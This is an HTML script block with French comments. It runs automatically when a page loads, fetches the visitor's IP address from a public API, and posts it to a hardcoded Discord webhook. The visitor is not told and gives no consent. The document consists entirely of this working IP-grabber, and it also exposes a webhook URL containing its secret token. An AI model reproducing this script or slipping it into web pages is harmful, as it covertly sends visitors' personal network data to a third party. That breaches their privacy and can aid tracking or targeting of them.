    <script>
async function sendIPToDiscord() {
    try {
        // Récupérer l'IP avec une API publique
        const response = await fetch("https://api64.ipify.org?format=json");
        const data = await response.json();
        const ip = data.ip;

        // URL du webhook Discord
        const webhook_url = "https://discord.com/api/webhooks/1355704665228185720/HmLhYwMJYO11AgCzYWb9BBxcsaXejudkdMiYO5C3mcFDtGgcIO773e42EJ8Dq0Te3aTK";

        // Message à envoyer
        const payload = JSON.stringify({ content: `L'adresse IP du visiteur est : ${ip}` });

        // Envoi de la requête à Discord
        await fetch(webhook_url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: payload
        });

        console.log("IP envoyée avec succès !");
    } catch (error) {
        console.error("Erreur lors de l'envoi de l'IP :", error);
    }
}

// Exécuter la fonction au chargement de la page
sendIPToDiscord();

    </script>
